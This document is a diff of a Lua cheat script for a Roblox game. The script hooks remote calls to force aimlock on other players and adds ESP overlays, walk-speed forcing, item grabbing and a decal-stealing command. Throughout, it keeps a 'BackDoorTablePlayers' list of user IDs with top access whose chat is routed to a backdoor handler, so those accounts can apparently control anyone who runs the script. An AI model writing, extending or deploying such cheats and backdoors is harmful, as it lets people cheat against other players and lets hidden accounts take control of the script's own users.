@@ -231,11 +231,6 @@ local BackDoorTablePlayers = {
 		['Name'] = "!fishgang Ambiguity [Admin]";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(57,52,52);
-	};
-	[284761493] = {
-		['Name'] = "Zero";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(255,255,255);
 	}
 }
 
@@ -371,15 +366,33 @@ local Args = {...}
 		if tostring(self) == "Fire" and Aimlock and AimlockTarget then 
 			local TargetPart = AimlockTarget.FindFirstChild(AimlockTarget,"HumanoidRootPart") or AimlockTarget.FindFirstChild(AimlockTarget,"Torso")
 			if TargetPart then
-				if AimMode == "OldPrediction" then 
+				if AimMode == "OldPrediction" then
 					return Namecall(self,TargetPart.CFrame + TargetPart.Velocity / AimbotVelocity)
 				elseif AimMode == "Prediction" then
 					return Namecall(self,TargetPart.CFrame + TargetPart.Velocity / NewPredictionVelocity)
-				end 
+				end
 			end 
 			if AimlockTarget.FindFirstChild(AimlockTarget,AimMode) then 
 				return Namecall(self,AimlockTarget[AimMode].CFrame)
 			end
+		end
+		if tostring(self) == "Input" and Aimlock and AimlockTarget then 
+			if typeof(Args[2]) == "table" then
+				local TargetPart = AimlockTarget.FindFirstChild(AimlockTarget,"HumanoidRootPart") or AimlockTarget.FindFirstChild(AimlockTarget,"Torso")
+				if TargetPart then
+					if AimMode == "OldPrediction" then 
+						Args[2].mousehit = TargetPart.CFrame + TargetPart.Velocity / AimbotVelocity
+						return Namecall(self,unpack(Args))
+					elseif AimMode == "Prediction" then
+						Args[2].mousehit = TargetPart.CFrame + TargetPart.Velocity / NewPredictionVelocity
+						return Namecall(self,unpack(Args))
+					end 
+				end
+				if AimlockTarget.FindFirstChild(AimlockTarget,AimMode) then 
+					Args[2].mousehit = AimlockTarget[AimMode].CFrame 
+					return Namecall(self,unpack(Args))
+				end 
+			end 
 		end 
 		if tostring(self.Parent) == "ReplicatedStorage" or Args[1] == "hey" and not tostring(self) == "SayMessageRequest" then 
 			return wait(9e9)
@@ -593,7 +606,7 @@ local function IsAUser(Player,Chat)
 end
 
 local function ColourifyGuns(GunTable,Colour)
-	for _,Tool in pairs(GunTable:GetChildren()) do
+	for ToolIndex,Tool in pairs(GunTable:GetChildren()) do
 		if Tool:IsA'Tool' and Tool:FindFirstChild'Fire' then  
 			for _,Part in pairs(Tool:GetDescendants()) do 
 				if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
@@ -609,7 +622,7 @@ local function ColourifyGuns(GunTable,Colour)
 end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
-	if BackdoorPlayer and BackdoorPlayer.Character then 
+	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.Character:FindFirstChildOfClass'Humanoid' then 
 		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
 		ColourifyGuns(BackdoorPlayer.Character,Colour)
 		BackdoorPlayer.Character.ChildAdded:Connect(function()
@@ -728,7 +741,7 @@ end
 
 local function Esp(Part,Name,Colour)
 	local Player = PlrFinder(Part.Parent.Name)
-	if Player and wggew and not Colour then
+	if Player and UseDrawingLib and not Colour then
 		Unesp(Player)
 		EspTable[#EspTable+1] = {['Player'] = Player,['Text'] = Drawing.new'Text',['Box'] = {Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'}}
 	else
@@ -747,17 +760,8 @@ local function Esp(Part,Name,Colour)
 		TextLabel.TextSize = 8
 		local Player = PlrFinder(Name)
 		if Player then
-			EspTable2[Player] = true
-			local Event;Event = RunService.Stepped:Connect(function()
-				if EspTable2[Player] then 
-					if Player.Character and Player.Character:FindFirstChild'Head' and Player.Character:FindFirstChildOfClass'Humanoid' then 
-						local User = AdminUserTable[Player] and "Yes" or "No"
-						TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist").."\nHealth: "..math.floor(Player.Character.Humanoid.Health).." | Position: "..math.floor((GetChar().Head.Position - Player.Character.Head.Position).magnitude)
-					end 
-				else 
-					Event:Disconnect()
-				end
-			end)
+			local User = AdminUserTable[Player] and "Yes" or "No"
+			TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
 		else 
 			TextLabel.Text = Name
 		end
@@ -921,6 +925,9 @@ local function StateChanged(Old,New)
 local Character = GetChar()
 	if NoGh then
 		if New == Enum.HumanoidStateType.Freefall or New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding then
+			if game.PlaceId == 455366377 and Flying then 
+				wait(0.3)
+			end
 			Character.Humanoid.PlatformStand = false
 			Character.Humanoid:ChangeState(8)
 		end
@@ -946,9 +953,6 @@ local function ColourChanger(T)
 	if T:IsA'ObjectValue' and T.Name == "creator" then 
 		if AutoTarget then
 			if Aimlock then 
-				if AimlockTarget ~= T.Value then 
-					notif("Autolock","Set the Aimlock player to "..AimlockTarget.Name,5,nil)
-				end 
 				AimlockTarget = T.Value
 				local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
 					if tostring(C) == tostring(AimlockTarget) then 
@@ -959,10 +963,7 @@ local function ColourChanger(T)
 					end
 				end)
 			end
-			if CamLocking then
-				if CamlockPlayer ~= Players:GetPlayerFromCharacter(T.Value) then 
-					notif("Autolock","Set the camlock player to "..T.Value.Name,5,nil)
-				end 
+			if CamLocking then 
 				CamlockPlayer = Players:GetPlayerFromCharacter(T.Value)
 			end
 		end
@@ -1022,6 +1023,10 @@ local function BehindAWall(Target)
 			return true 
 		end 
 	end 
+end
+
+local function LoopChangeWalkSpeed()
+	GetChar().Humanoid.WalkSpeed = WalkSpeed
 end
 
 -- [[ End ]] -- 
@@ -1103,7 +1108,7 @@ local CharacterChildAdded;CharacterChildAdded = LP.Character.ChildAdded:Connect(
 local HealthChangedEvent;HealthChangedEvent = LP.Character.Humanoid.HealthChanged:Connect(HealthChanged)
 local HumanoidStateChanged;HumanoidStateChanged = LP.Character.Humanoid.StateChanged:Connect(StateChanged)
 local ColourChangerEvent;ColourChangerEvent = LP.Character.DescendantAdded:Connect(ColourChanger)
-
+local WalkSpeedChangedEvent;WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)
 LP.CharacterAdded:Connect(function(C)
 	Flying = false 
 	C:WaitForChild'Humanoid' -- wait until the humanoid has been found
@@ -1123,6 +1128,10 @@ LP.CharacterAdded:Connect(function(C)
 	ColourChangerEvent:Disconnect()
 	ColourChangerEvent = nil
 	ColourChangerEvent = C.Humanoid.DescendantAdded:Connect(ColourChanger)
+	-- WalkSpeed Event -- 
+	WalkSpeedChangedEvent:Disconnect()
+	WalkSpeedChangedEvent = nil 
+	WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)
 	-- Loop Properties -- 
 	C.Humanoid.WalkSpeed = SpawnWs or NormalWs
 	C.Humanoid.JumpPower = SpawnJP or NormalJP
@@ -1345,9 +1354,6 @@ end)
 Players.PlayerRemoving:Connect(function(Player)
 	if ExploitDetectionPlayerTablePositions[tostring(Player)] then 
 		ExploitDetectionPlayerTablePositions[tostring(Player)] = nil
-	end
-	if EspTable2[Player] then 
-		EspTable2[Player] = nil
 	end
 	Unesp(Player)
 end)
@@ -1736,7 +1742,7 @@ end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp","[He
 
 AddCommand(function()
 	if game.PlaceId ~= 455366377 then notif("Heal","Streets Only",5,nil) return end
-	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Fire' then notif("Tool needed","Hold a gun",5,nil) return end 
+	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips' then notif("Tool needed","Hold a gun",5,nil) return end 
 	GrabItem("ammo",GetChar().Head.CFrame)
 end,"reload",{"r"},"Gives your current gun ammo","[No Args]")
 
@@ -1929,7 +1935,7 @@ AddCommand(function(Arguments)
 end,"decalsteal",{},"Steals a persons decal","[Player]")
 
 AddCommand(function()
-	if game.PlaceId ~= 455366377 then notif("Wont work","Streets Only",5,nil) return end 
+	if not game.PlaceId == 455366377 then notif("Wont work","Streets Only",5,nil) end 
 	if RainbowHats then RainbowHats = false LP.Backpack.Stank:FireServer("ren") end
 	if RainbowFrame.Visible then RainbowFrame.Visible = false return end 
 	RainbowScrolling:ClearAllChildren()
@@ -2130,10 +2136,11 @@ AddCommand(function(Arguments)
 				for i = 1,#Player do
 					local ActualPlr = Player[i]
 					if ActualPlr ~= LP and ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then
+						EspTable2[ActualPlr] = true 
 						Esp(ActualPlr.Character.Head,Player.Name)
 						local EspEvent;EspEvent = ActualPlr.CharacterAdded:Connect(function(C)
 							local Head = C:WaitForChild'Head'
-							if EspTable2[Player] then 
+							if EspTable[Player] then 
 								Esp(Head,Player.Name)
 							else 
 								EspEvent:Disconnect()
@@ -2143,10 +2150,11 @@ AddCommand(function(Arguments)
 				end
 			else
 				if Player.Character and Player.Character:FindFirstChild'Head' then
+					EspTable2[Player] = true 
 					Esp(Player.Character.Head,Player.Name)
 					local EspEvent;EspEvent = Player.CharacterAdded:Connect(function(C)
 						local Head = C:WaitForChild'Head'
-						if EspTable2[Player] then 
+						if EspTable[Player] then 
 							Esp(Head,Player.Name)
 						else 
 							EspEvent:Disconnect()
@@ -2368,12 +2376,13 @@ coroutine.resume(coroutine.create(function()
 	
 	DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
 	DmgIndicator.BackgroundTransparency = 0.7
-	DmgIndicator.BorderColor3 = Color3.fromRGB(170,0,0)
+	DmgIndicator.BorderSizePixel = 3
 	DmgIndicator.Position = UDim2.new(0,0,1,0)
 	DmgIndicator.Size = UDim2.new(0,385,0,50)
 	DmgIndicator.Font = Enum.Font.Code
-	DmgIndicator.TextColor3 = Color3.fromRGB(255,255,255)
-	DmgIndicator.TextSize = 14
+	DmgIndicator.TextColor3 = Color3.fromRGB(184,0,3)
+	DmgIndicator.TextScaled = true
+	DmgIndicator.TextSize = 30
 	DmgIndicator.TextWrapped = true
 	DmgIndicator.Visible = false 
 end))
@@ -2420,7 +2429,7 @@ coroutine.resume(coroutine.create(function()
 					if game.PlaceId == 455366377 and not Character:FindFirstChild'HumanoidRootPart' then 
 						Character.Humanoid:ChangeState(3)
 						Character.Humanoid.PlatformStand = false
-						wait(0.1)
+						RunService.RenderStepped:Wait()
 					end
 					Character.Humanoid:ChangeState(8)
 				end
@@ -2516,7 +2525,7 @@ coroutine.resume(coroutine.create(function()
 					Table['Box'][3].To = Vector2.new(TopLeft.X,TopLeft.Y)
             	end 
         	end 
-		end
+    	end 
 	end
 end))
 
@@ -2560,13 +2569,15 @@ coroutine.resume(coroutine.create(function()
 		local Backdoor = BackDoorTablePlayers[Player.UserId]
 		if Backdoor and Player.Character and Player.Character:FindFirstChild'Head' then
 			Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
-			Player.CharacterAdded:Connect(function(C)
-				local Head = C:WaitForChild'Head'
-				Esp(Head,Backdoor['Name'],Backdoor['Colour'])
-				initalizeBackdoorPart2(Player,Backdoor['Colour'])
-			end)
 			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
 			initalizeBackdoorPart2(Player,Backdoor['Colour'])
+			Player.CharacterAdded:Connect(function(C)
+				local Head = C:WaitForChild'Head'
+				if Head then
+					initalizeBackdoorPart2(Player,Backdoor['Colour'])
+					Esp(Head,Backdoor['Name'],Backdoor['Colour'])
+				end
+			end)
 		end
 		local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
 		local User = IsAUser(Player,Chat)
